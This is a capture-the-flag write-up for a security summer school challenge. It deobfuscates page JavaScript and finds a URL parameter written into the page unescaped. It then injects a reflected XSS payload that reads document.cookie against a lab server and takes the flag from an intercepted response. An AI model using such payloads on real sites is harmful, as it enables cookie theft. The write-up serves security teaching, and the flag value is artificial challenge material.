---
Name: "Future Club"
Category: "Security Summer School"
Difficulty: "Medium"
Description: "Deobfuscating client-side JavaScript to discover the required flag parameter."
---

# Future Club
We find some javascript code in the page source
```javascript
function sdwr(_0xaedcx1){return _0xaedcx1["\x63\x68\x61\x72\x41\x74"](0)+ _0xaedcx1["\x73\x6C\x69\x63\x65"](1)}function dggr(_0xaedcx3,_0xaedcx4){return Math["\x66\x6C\x6F\x6F\x72"](Math["\x72\x61\x6E\x64\x6F\x6D"]()* (_0xaedcx4- _0xaedcx3))+ _0xaedcx3}function scsdf(){var _0xaedcx6=["\x66\x75\x74\x75\x72\x65","\x63\x6C\x75\x62","\x79\x6F\x75\x5F\x61\x72\x65\x5F\x6F\x6E\x5F\x79\x6F\x75\x72"];var _0xaedcx7=["\x63\x6C\x75\x62","\x66\x75\x74\x75\x72\x65","\x77\x61\x79","\x53\x53\x53"];var _0xaedcx8=sdwr(_0xaedcx6[dggr(0,_0xaedcx6["\x6C\x65\x6E\x67\x74\x68"])])+ '\x5F'+ sdwr(_0xaedcx7[dggr(0,_0xaedcx7["\x6C\x65\x6E\x67\x74\x68"])]);return _0xaedcx8}var vdsgvsvergvbwe=scsdf();var dfeqwdvdvedvd=window["\x6C\x6F\x63\x61\x74\x69\x6F\x6E"]["\x68\x72\x65\x66"];var bfggbgbgbgbg= new URL(dfeqwdvdvedvd);var vdvsvseghe=bfggbgbgbgbg["\x73\x65\x61\x72\x63\x68\x50\x61\x72\x61\x6D\x73"]["\x67\x65\x74"](vdsgvsvergvbwe);document["\x77\x72\x69\x74\x65"]("\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x30\x3E"+ vdvsvseghe+ "\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E")
```

Deobfuscating it results in
```javascript
function sdwr(str) {
    return str.charAt(0) + str.slice(1);
}

function dggr(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

function scsdf() {
    var arr1 = [
        "future",
        "club",
        "you_are_on_your"
    ];

    var arr2 = [
        "club",
        "future",
        "way",
        "SSS"
    ];

    var param =
        sdwr(arr1[dggr(0, arr1.length)]) +
        "_" +
        sdwr(arr2[dggr(0, arr2.length)]);

    return param;
}

var randomParam = scsdf();

var currentUrl = window.location.href;
var url = new URL(currentUrl);

var value = url.searchParams.get(randomParam);

document.write("<option value=0>" + value + "</option>");
```

Kept calling it with an option untill it worked
```bash
http://141.85.224.102:8083/?future_way=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

Got this error
```txt
Cookie “flag” has been rejected because a non-HTTPS cookie can’t be set as “secure”.
```

Now trying https
```bash
https://141.85.224.102:8083/?future_way=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

The secure connection could not be made, the TLS handshake failed

Then I intercepted the response with burp and got
```
Set-Cookie: flag="SSS{future_club_obfuscation}"; HttpOnly;
```

---

